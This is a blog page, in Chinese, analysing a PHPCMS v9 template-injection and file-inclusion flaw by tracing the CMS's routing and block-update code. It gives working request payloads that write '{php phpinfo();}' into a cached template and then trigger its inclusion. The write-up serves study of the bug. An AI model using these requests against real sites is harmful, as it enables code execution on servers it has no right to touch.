@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>phpcmsv9文件包含漏洞 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言phpcmsv9文件包含漏洞 很早的漏洞,重新分析一下. 漏洞分析路由分析路由分析index.php: 1234567891011121314151617&lt;?php&#x2F;** *  index.php PHPCMS 入口 * * @copyright			(C) 2005-2010 PHPCMS * @license				http:&#x2F;&#x2F;www.phpcms.cn&#x2F;license&#x2F; * @l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcmsv9文件包含漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/02/03/phpcmsv9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言phpcmsv9文件包含漏洞 很早的漏洞,重新分析一下. 漏洞分析路由分析路由分析index.php: 1234567891011121314151617&lt;?php&#x2F;** *  index.php PHPCMS 入口 * * @copyright			(C) 2005-2010 PHPCMS * @license				http:&#x2F;&#x2F;www.phpcms.cn&#x2F;license&#x2F; * @l">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//1.png">
+<meta property="og:image" content="http://yoursite.com/.com//2.png">
+<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="og:image" content="http://yoursite.com/.com//4.png">
+<meta property="og:image" content="http://yoursite.com/.com//5.png">
+<meta property="og:image" content="http://yoursite.com/.com//6.png">
+<meta property="og:image" content="http://yoursite.com/.com//7.png">
+<meta property="og:image" content="http://yoursite.com/.com//9.png">
+<meta property="og:image" content="http://yoursite.com/.com//8.png">
+<meta property="og:image" content="http://yoursite.com/.com//10.png">
+<meta property="og:image" content="http://yoursite.com/.com//11.png">
+<meta property="og:image" content="http://yoursite.com/.com//12.png">
+<meta property="og:image" content="http://yoursite.com/.com//13.png">
+<meta property="og:image" content="http://yoursite.com/.com//14.png">
+<meta property="og:image" content="http://yoursite.com/.com//15.png">
+<meta property="og:image" content="http://yoursite.com/.com//16.png">
+<meta property="og:image" content="http://yoursite.com/.com//17.png">
+<meta property="article:published_time" content="2020-02-03T06:09:02.000Z">
+<meta property="article:modified_time" content="2020-02-10T08:56:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-phpcmsv9文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/03/phpcmsv9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2020-02-03T06:09:02.000Z" itemprop="datePublished">2020-02-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpcmsv9文件包含漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9文件包含漏洞</p>
+<p>很早的漏洞,重新分析一下.</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>路由分析<code>index.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  index.php PHPCMS 入口</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>			(C) 2005-2010 PHPCMS</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>				http://www.phpcms.cn/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@lastmodify</span>			2010-6-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//PHPCMS根目录</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'PHPCMS_PATH'</span>, dirname(<span class="keyword">__FILE__</span>).DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> PHPCMS_PATH.<span class="string">'/phpcms/base.php'</span>;</span><br><span class="line"></span><br><span class="line">pc_base::creat_app();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>跟进<code>/phpcms/base.php</code>,这是PHPCMS框架入口文件</p>
+<p><img src="/.com//1.png" alt="1580710551613"></p>
+<p>文件头就定义了<code>IN_PHPCMS</code>为<code>true</code></p>
+<p>回到<code>index.php</code>,以下的代码是在调用<code>base.php</code>中的<code>pc_base</code>类的<code>creat_app()</code>函数.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pc_base::creat_app();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//2.png" alt="1580710888328"></p>
+<p>分析一下路由,在<code>base.php</code>中分别有三个加载模块所需要调用的方法</p>
+<p><img src="/.com//3.png" alt="1580711108427"></p>
+<p>这三个都是去调用<code>_load_class</code>函数</p>
+<p><img src="/.com//4.png" alt="1580711693698"></p>
+<p>分析这个函数</p>
+<p>可以明白</p>
+<p><code>load_sys_class</code>调用<code>./phpcms/libs/classes</code>的文件</p>
+<p><code>load_app_class</code>调用<code>./phpcms/modules/模块名/classes</code>的文件</p>
+<p><code>load_model</code>调用<code>./phpcms/model</code>的文件</p>
+<p>回过头来再看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creat_app</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::load_sys_class(<span class="string">'application'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后跟进<code>./phpcms/libs/classes/application.class.php</code></p>
+<p><img src="/.com//5.png" alt="1580714488524"></p>
+<p>然后跟进<code>./phpcms/libs/classes/param.class.php</code>,在<code>application.class.php</code>中分别调用了<code>route_m</code>,<code>route_c</code>,<code>route_a</code></p>
+<p><img src="/.com//6.png" alt="1580714785175"></p>
+<p>可通过传参来指定调用模型,控制器,事件</p>
+<p>然后回到<code>application.class.php</code>,调用函数<code>init()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$controller = <span class="keyword">$this</span>-&gt;load_controller();</span><br><span class="line">	<span class="keyword">if</span> (method_exists($controller, ROUTE_A)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (preg_match(<span class="string">'/^[_]/i'</span>, ROUTE_A)) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">'You are visiting the action is to protect the private action'</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			call_user_func(<span class="keyword">array</span>($controller, ROUTE_A));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'Action does not exist.'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后调用<code>load_controller()</code>,加载事件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">load_controller</span><span class="params">($filename = <span class="string">''</span>, $m = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($filename)) $filename = ROUTE_C;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($m)) $m = ROUTE_M;</span><br><span class="line">	$filepath = PC_PATH.<span class="string">'modules'</span>.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">if</span> (file_exists($filepath)) &#123;</span><br><span class="line">		$classname = $filename;</span><br><span class="line">		<span class="keyword">include</span> $filepath;</span><br><span class="line">		<span class="keyword">if</span> ($mypath = pc_base::my_path($filepath)) &#123;</span><br><span class="line">			$classname = <span class="string">'MY_'</span>.$filename;</span><br><span class="line">			<span class="keyword">include</span> $mypath;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> $classname;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>定位:<code>./phpcms/modules/block/block_admin.php::block_update()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">block_update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; intval($_GET[<span class="string">'id'</span>]) ? intval($_GET[<span class="string">'id'</span>]) :  showmessage(L(<span class="string">'illegal_operation'</span>), HTTP_REFERER);</span><br><span class="line">	<span class="comment">//进行权限判断</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;roleid != <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;priv_db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'blockid'</span>=&gt;$id, <span class="string">'roleid'</span>=&gt;<span class="keyword">$this</span>-&gt;roleid, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid))) &#123;</span><br><span class="line">			showmessage(L(<span class="string">'not_have_permissions'</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!$data = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id))) &#123;</span><br><span class="line">		showmessage(L(<span class="string">'nofound'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">		$sql = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">if</span> ($data[<span class="string">'type'</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">			$title = <span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) ? $_POST[<span class="string">'title'</span>] : <span class="string">''</span>;</span><br><span class="line">			$url = <span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) ? $_POST[<span class="string">'url'</span>] : <span class="string">''</span>;</span><br><span class="line">			$thumb = <span class="keyword">isset</span>($_POST[<span class="string">'thumb'</span>]) ? $_POST[<span class="string">'thumb'</span>] : <span class="string">''</span>;</span><br><span class="line">			$desc = <span class="keyword">isset</span>($_POST[<span class="string">'desc'</span>]) ? $_POST[<span class="string">'desc'</span>] : <span class="string">''</span>;</span><br><span class="line">			$template = <span class="keyword">isset</span>($_POST[<span class="string">'template'</span>]) &amp;&amp; trim($_POST[<span class="string">'template'</span>]) ? trim($_POST[<span class="string">'template'</span>]) : <span class="string">''</span>;</span><br><span class="line">			$datas = <span class="keyword">array</span>();</span><br><span class="line">			<span class="keyword">foreach</span> ($title <span class="keyword">as</span> $key=&gt;$v) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">empty</span>($v) || !<span class="keyword">isset</span>($url[$key]) ||<span class="keyword">empty</span>($url[$key])) <span class="keyword">continue</span>;</span><br><span class="line">				$datas[$key] = <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$v, <span class="string">'url'</span>=&gt;$url[$key], <span class="string">'thumb'</span>=&gt;$thumb[$key], <span class="string">'desc'</span>=&gt;str_replace(<span class="keyword">array</span>(chr(<span class="number">13</span>), chr(<span class="number">43</span>)), <span class="keyword">array</span>(<span class="string">'&lt;br /&gt;'</span>, <span class="string">'&amp;nbsp;'</span>), $desc[$key]));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($template) &#123;</span><br><span class="line">				$block = pc_base::load_app_class(<span class="string">'block_tag'</span>);</span><br><span class="line">				$block-&gt;template_url($id, $template);</span><br><span class="line">			&#125;</span><br><span class="line">               .....</span><br><span class="line">                   ....</span><br><span class="line">                   ......</span><br></pre></td></tr></table></figure>
+
+<p>关键代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($template) &#123;</span><br><span class="line">	$block = pc_base::load_app_class(<span class="string">'block_tag'</span>);</span><br><span class="line">	$block-&gt;template_url($id, $template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了<code>template_url</code>()</p>
+<p>跟进至<code>./phpcms/modules/block/classes/block_tag.class.php::template_url()</code></p>
+<p><img src="/.com//7.png" alt="1580717922585"></p>
+<p>对照<code>template_url()</code>的内容,回到<code>block_update()</code>.其中<code>$template</code>和<code>$id</code>都是我们能控制的.然后这里调用了<code>teemplate_cache.class.php</code>的<code>template_parse()</code></p>
+<p><img src="/.com//9.png" alt="1580718778371"></p>
+<p>这里其实不严谨,令payload为<code>{php phpinfo();}</code>就可以绕过</p>
+<p>最有意思的一点来了,<code>block_update()</code>在逻辑上是一段更新数据用的代码</p>
+<p>所以这个数据首先得存在才可以</p>
+<p>那么我们先看<code>block_admin.php</code>的<code>add()</code></p>
+<p><img src="/.com//8.png" alt="1580718565532"></p>
+<p>然后构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)添加一个数据,添加后如数据库所示</span><br><span class="line">payload:</span><br><span class="line">?m=block&amp;c=block_admin&amp;a=add&amp;pos=<span class="number">1</span>&amp;pc_hash=pI9K4g</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;name=test&amp;type=<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">(<span class="number">2</span>)更新数据,更新后的结果如下图</span><br><span class="line">payload</span><br><span class="line">?m=block&amp;c=block_admin&amp;a=block_update&amp;id=<span class="number">2</span>&amp;pc_hash=pI9K4g</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;template=&#123;php phpinfo();&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//10.png" alt="1580720665955"></p>
+<p><img src="/.com//11.png" alt="1580720939249"></p>
+<p>文件已经写入</p>
+<p><img src="/.com//12.png" alt="1580721206741"></p>
+<p>接着就是如何读取文件,如果像平时那样直接根据路径会读文件,会因为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'No permission resources.'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>而无法读取,但是如果在后台有登录的情况下,由于在base.php中的如下代码,</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_PHPCMS'</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p>则可以通过构造payload读取木马文件.</p>
+<p><code>/phpcms/modules/block/classes/block_tag.class.php:pc_tag()</code></p>
+<p><img src="/.com//13.png" alt="1580721499533"></p>
+<p>其中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br></pre></td></tr></table></figure>
+
+<p>将会根据id去读取<code>/phpcms/caches/caches_template/block</code>里的文件.</p>
+<p>然后这时候看到<code>./phpcms/modules/link/index.php::register()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		$siteid = SITEID;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>]))&#123;</span><br><span class="line">			<span class="keyword">if</span>($_POST[<span class="string">'name'</span>]==<span class="string">""</span>)&#123;</span><br><span class="line">				showmessage(L(<span class="string">'sitename_noempty'</span>),<span class="string">"?m=link&amp;c=index&amp;a=register&amp;siteid=$siteid"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>($_POST[<span class="string">'url'</span>]==<span class="string">""</span> || !preg_match(<span class="string">'/^http:\/\/(.*)/i'</span>, $_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">				showmessage(L(<span class="string">'siteurl_not_empty'</span>),<span class="string">"?m=link&amp;c=index&amp;a=register&amp;siteid=$siteid"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!in_array($_POST[<span class="string">'linktype'</span>],<span class="keyword">array</span>(<span class="string">'0'</span>,<span class="string">'1'</span>)))&#123;</span><br><span class="line">				$_POST[<span class="string">'linktype'</span>] = <span class="string">'0'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$link_db = pc_base::load_model(link_model);</span><br><span class="line">			$_POST[<span class="string">'logo'</span>] =new_html_special_chars($_POST[<span class="string">'logo'</span>]);</span><br><span class="line"></span><br><span class="line">		$logo = safe_replace(strip_tags($_POST[<span class="string">'logo'</span>]));</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^http:\/\/(.*)/i'</span>, $logo))&#123;</span><br><span class="line">			$logo = <span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$name = safe_replace(strip_tags($_POST[<span class="string">'name'</span>]));</span><br><span class="line">		$url = safe_replace(strip_tags($_POST[<span class="string">'url'</span>]));</span><br><span class="line">		$url = trim_script($url);</span><br><span class="line">			<span class="keyword">if</span>($_POST[<span class="string">'linktype'</span>]==<span class="string">'0'</span>)&#123;</span><br><span class="line">				$sql = <span class="keyword">array</span>(<span class="string">'siteid'</span>=&gt;$siteid,<span class="string">'typeid'</span>=&gt;intval($_POST[<span class="string">'typeid'</span>]),<span class="string">'linktype'</span>=&gt;intval($_POST[<span class="string">'linktype'</span>]),<span class="string">'name'</span>=&gt;$name,<span class="string">'url'</span>=&gt;$url);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$sql = <span class="keyword">array</span>(<span class="string">'siteid'</span>=&gt;$siteid,<span class="string">'typeid'</span>=&gt;intval($_POST[<span class="string">'typeid'</span>]),<span class="string">'linktype'</span>=&gt;intval($_POST[<span class="string">'linktype'</span>]),<span class="string">'name'</span>=&gt;$name,<span class="string">'url'</span>=&gt;$url,<span class="string">'logo'</span>=&gt;$logo);</span><br><span class="line">			&#125;</span><br><span class="line">			$link_db-&gt;insert($sql);</span><br><span class="line">			showmessage(L(<span class="string">'add_success'</span>), <span class="string">"?m=link&amp;c=index&amp;siteid=$siteid"</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> 			$setting = getcache(<span class="string">'link'</span>, <span class="string">'commons'</span>);</span><br><span class="line">		$setting = $setting[$siteid];</span><br><span class="line">			<span class="keyword">if</span>($setting[<span class="string">'is_post'</span>]==<span class="string">'0'</span>)&#123;</span><br><span class="line">				showmessage(L(<span class="string">'suspend_application'</span>), HTTP_REFERER);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;type = pc_base::load_model(<span class="string">'type_model'</span>);</span><br><span class="line">			$types = <span class="keyword">$this</span>-&gt;type-&gt;get_types($siteid);<span class="comment">//获取站点下所有友情链接分类</span></span><br><span class="line">			pc_base::load_sys_class(<span class="string">'form'</span>, <span class="string">''</span>, <span class="number">0</span>);</span><br><span class="line"> 			$SEO = seo(SITEID, <span class="string">''</span>, L(<span class="string">'application_links'</span>), <span class="string">''</span>, <span class="string">''</span>);</span><br><span class="line">  			<span class="keyword">include</span> template(<span class="string">'link'</span>, <span class="string">'register'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中最关键是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'link'</span>, <span class="string">'register'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>跟进template()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'content'</span>, $template = <span class="string">'index'</span>, $style = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(strpos($module, <span class="string">'plugin/'</span>)!== <span class="keyword">false</span>) &#123;</span><br><span class="line">		$plugin = str_replace(<span class="string">'plugin/'</span>, <span class="string">''</span>, $module);</span><br><span class="line">		<span class="keyword">return</span> p_template($plugin, $template,$style);</span><br><span class="line">	&#125;</span><br><span class="line">	$module = str_replace(<span class="string">'/'</span>, DIRECTORY_SEPARATOR, $module);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($style) &amp;&amp; preg_match(<span class="string">'/([a-z0-9\-_]+)/is'</span>,$style)) &#123;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (<span class="keyword">empty</span>($style) &amp;&amp; !defined(<span class="string">'STYLE'</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span>(defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">		</span><br><span class="line">		.....</span><br><span class="line">		.....</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"123"</span>;</span><br><span class="line">	var_dump($compiledtplfile);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"123"</span>;</span><br><span class="line">	<span class="keyword">return</span> $compiledtplfile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//14.png" alt="1580725647023"></p>
+<p>可以把这个路径打印出来看看是怎么回事</p>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=link&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//15.png" alt="1580725784534"></p>
+<p>然后跟进register.php</p>
+<p><img src="/.com//16.png" alt="1580725858654"></p>
+<p>发现这里会调用pc_tag(),<strong>当然也可以全局搜索,然后来看看哪里调用了pc_tag()</strong></p>
+<p>既然调用了pc_tag(),那么木马文件就会被读取</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=link&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//17.png" alt="1580726010375"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好多之前没有懂的东西,都懂了.炒冷饭现场…….</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/03/phpcmsv9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5k50019kou56lxcfpn3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          phpcmsv9Sql注入漏洞
+        
+      </div>
+    </a>
+  
